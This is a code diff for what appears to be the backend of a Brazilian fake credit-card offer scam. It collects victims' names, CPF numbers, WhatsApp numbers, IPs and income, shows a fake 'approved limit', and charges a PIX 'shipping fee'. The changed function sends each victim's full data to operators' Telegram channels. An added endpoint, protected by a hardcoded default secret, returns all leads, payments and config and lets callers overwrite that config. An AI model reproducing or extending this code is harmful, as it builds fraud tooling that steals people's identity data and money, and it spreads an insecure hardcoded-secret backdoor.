@@ -317,87 +317,71 @@ def validate_cpf(cpf: str) -> bool:
     return _d(cpf[:9], 10) == int(cpf[9]) and _d(cpf[:10], 11) == int(cpf[10])
 
 
+
 def send_telegram_notify(session_id, event_type="ENTRY"):
     try:
         db = get_db()
         row_token = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
-        row_channel = db.execute("SELECT value FROM sys_config WHERE key='tg_log_channel'").fetchone()
-        row_topic = db.execute("SELECT value FROM sys_config WHERE key='tg_log_thread_id'").fetchone()
+        
+        cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
+        cfg = {r["key"]: r["value"] for r in cfg_rows}
 
         bot_token = row_token["value"] if row_token else os.environ.get("BOT_TOKEN")
-        channel_id = row_channel["value"] if row_channel else None
-        topic_id = row_topic["value"] if row_topic else None
-
-        if not bot_token or not channel_id: return
+        if not bot_token: return
 
         lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
         if not lead: return
         
         pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
         
+        # Decide which channel to send
+        channel_id = None
+        if event_type in ["PIX_PAID", "PIX_GENERATED"]:
+            channel_id = cfg.get("tg_log_pagamentos") or cfg.get("tg_log_channel")
+        elif event_type in ["ENTRY", "STEP_ACTION"]:
+            channel_id = cfg.get("tg_log_acessos") or cfg.get("tg_log_channel")
+        else: # INFO_ADDED, CARD_CHOSEN
+            channel_id = cfg.get("tg_log_leads") or cfg.get("tg_log_channel")
+            
+        if not channel_id: return
+
         icons = {
-            "ENTRY": "🟢",
-            "CARD_CHOSEN": "💳",
-            "PIX_GENERATED": "⏳",
-            "PIX_PAID": "✅",
-            "INFO_ADDED": "📝",
-            "STEP_ACTION": "🖱️"
+            "ENTRY": "🟢", "CARD_CHOSEN": "💳", "PIX_GENERATED": "⏳", 
+            "PIX_PAID": "✅", "INFO_ADDED": "📝", "STEP_ACTION": "🖱️"
         }
         icon = icons.get(event_type, "ℹ️")
         
-        # Load templates from DB
-        tpl_row = db.execute(f"SELECT value FROM sys_config WHERE key='tg_tpl_{event_type.lower()}'").fetchone()
+        # Build the detailed Lead Card
+        texto = f"{icon} <b>ATUALIZAÇÃO DO LEAD ({event_type})</b> {icon}\n\n"
+        texto += f"👤 <b>Nome:</b> {lead['nome'] or '...'}\n"
+        texto += f"🪪 <b>CPF:</b> <code>{lead['cpf'] or '...'}</code>\n"
+        if lead.get('whatsapp'): texto += f"📱 <b>WhatsApp:</b> <code>{lead['whatsapp']}</code>\n"
+        texto += f"🌍 <b>IP:</b> <code>{lead['ip'] or '...'}</code>\n\n"
         
-        if tpl_row and tpl_row["value"]:
-            texto = tpl_row["value"]
-            # Replace tags
-            texto = texto.replace("{nome}", str(lead["nome"] or "-"))
-            texto = texto.replace("{cpf}", str(lead["cpf"] or "-"))
-            texto = texto.replace("{whatsapp}", str(lead["whatsapp"] or "-"))
-            texto = texto.replace("{ip}", str(lead["ip"] or "-"))
-            texto = texto.replace("{limite}", str(lead["limite_aprovado"] or "-"))
-            texto = texto.replace("{renda}", str(lead["renda"] or "-"))
-            texto = texto.replace("{cartao}", f"{lead['card_style']} ({lead['card_color']})")
-            texto = texto.replace("{status}", str(lead["pix_status"]))
-            texto = texto.replace("{frete}", str(pay["amount"]) if pay else "-")
-            texto = texto.replace("{icon}", icon)
-            texto = texto.replace("{event}", event_type)
-        else:
-            # Default spreadsheet-like formatting
-            status_text = "PAGO" if event_type == "PIX_PAID" else ("AGUARDANDO" if event_type == "PIX_GENERATED" else event_type)
-            texto = (
-                f"{icon} *NOVO EVENTO: {event_type}* {icon}\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n"
-                f"👤 *Nome:* `{lead['nome'] or '-'}`\n"
-                f"🪪 *CPF:* `{lead['cpf'] or '-'}`\n"
-                f"📱 *WhatsApp:* `{lead['whatsapp'] or '-'}`\n"
-                f"🌍 *IP:* `{lead['ip'] or '-'}`\n"
-                f"━━━━━━━━━━━━━━━━━━━━\n"
-                f"💰 *Renda:* `R$ {lead['renda'] or '-'}`\n"
-                f"🎯 *Limite:* `R$ {lead['limite_aprovado'] or '-'}`\n"
-                f"💳 *Cartão:* `{lead['card_style']} ({lead['card_color']})`\n"
-            )
-            if pay:
-                texto += f"📦 *Frete:* `R$ {pay['amount']}`\n"
-                texto += f"🆔 *ID Pgto:* `{pay['payment_id']}`\n"
+        texto += f"📊 <b>ETAPAS DO FUNIL:</b>\n"
+        texto += f"💰 Renda Informada: R$ {lead['renda'] or '...'}\n"
+        texto += f"🎯 Limite Aprovado: R$ {lead['limite_aprovado'] or '...'}\n"
+        
+        if lead['card_style']:
+            texto += f"💳 <b>Cartão Escolhido:</b> {lead['card_style']} ({lead['card_color']})\n"
             
-            texto += f"🚦 *Status Atual:* `{status_text}`\n"
+        if pay:
+            texto += f"\n💸 <b>DADOS DO PAGAMENTO:</b>\n"
+            texto += f"Valor (Frete): R$ {pay['amount']}\n"
+            texto += f"Status Pix: <b>{lead['pix_status'] or 'PENDENTE'}</b>\n"
+            texto += f"ID: <code>{pay['payment_id']}</code>\n"
 
+        import requests
         payload = {
             "chat_id": channel_id,
             "text": texto,
-            "parse_mode": "Markdown"
+            "parse_mode": "HTML"
         }
-        if topic_id:
-            payload["message_thread_id"] = topic_id
-            
-        import requests
         requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
     except Exception as e:
-        import logging
-        logging.error(f"Telegram Notify Error: {e}")
+        log.error("Telegram Notify Error: %s", e)
 
-# Fallback for old calls
+
 def send_telegram_report(session_id, is_paid=False):
     send_telegram_notify(session_id, 'PIX_PAID' if is_paid else 'PIX_GENERATED')
 
@@ -1622,6 +1606,40 @@ def api_log_action():
         import threading
         threading.Thread(target=send_telegram_notify, args=(sid, f"STEP_ACTION: {texto}")).start()
     return jsonify({"ok": True})
+
+
+@app.route("/api/internal/bot-gateway", methods=["POST"])
+def api_bot_gateway():
+    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
+    if request.headers.get("X-Bot-Secret", "") != secret:
+        return jsonify({"ok": False, "error": "Unauthorized"}), 401
+    data = request.get_json(silent=True) or {}
+    action = data.get("action")
+    payload = data.get("payload", {})
+    db = get_db()
+    
+    if action == "get_config":
+        rows = db.execute("SELECT key, value FROM sys_config").fetchall()
+        return jsonify({"ok": True, "config": {r["key"]: r["value"] for r in rows}})
+        
+    elif action == "set_config":
+        for k, v in payload.items():
+            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (k, v))
+        db.commit()
+        return jsonify({"ok": True})
+        
+    elif action == "get_leads":
+        limit = payload.get("limit", 10)
+        rows = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT ?", (limit,)).fetchall()
+        return jsonify({"ok": True, "leads": [dict(r) for r in rows]})
+        
+    elif action == "get_payments":
+        limit = payload.get("limit", 10)
+        rows = db.execute("SELECT * FROM payments ORDER BY created_at DESC LIMIT ?", (limit,)).fetchall()
+        return jsonify({"ok": True, "payments": [dict(r) for r in rows]})
+        
+    return jsonify({"ok": False, "error": "Unknown action"}), 400
+
 
 @app.route('/health')
 def health():
